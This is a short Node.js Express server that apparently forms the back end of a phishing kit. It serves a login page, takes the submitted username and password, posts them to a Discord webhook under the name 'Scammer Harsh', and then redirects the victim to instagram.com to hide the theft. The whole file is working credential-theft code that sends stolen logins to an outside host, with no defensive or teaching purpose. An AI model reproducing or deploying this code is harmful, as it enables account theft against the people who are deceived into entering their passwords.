const express = require("express");
const axios = require("axios");
const app = express();
require("dotenv").config();

app.use(express.urlencoded({ extended: true }));
app.use(express.static("public"));

app.get("/", (req, res) => {
  res.sendFile(__dirname + "/index.html");
});

app.post("/", async (req, res) => {
  // console.log(req.body);
  const uname = req.body.username;
  const pass = req.body.password;

  await axios
    .post(process.env.DISCORD_WEBHOOK_URL, {
      content: `\`\`\`\nUsername: ${uname}\nPassword: ${pass}\`\`\``,
      avatar_url:
        "https://cdn.discordapp.com/avatars/326751032489017346/a_7d0249eb98292a8ddda9ee091ea66252.png",
      username: "Scammer Harsh",
    })
    .catch((err) => {
      console.log(err);
    });
  res.redirect("https://www.instagram.com/");
});

app.listen(process.env.PORT || "3000", () => {
  console.log("Server is running on port :3000");
});
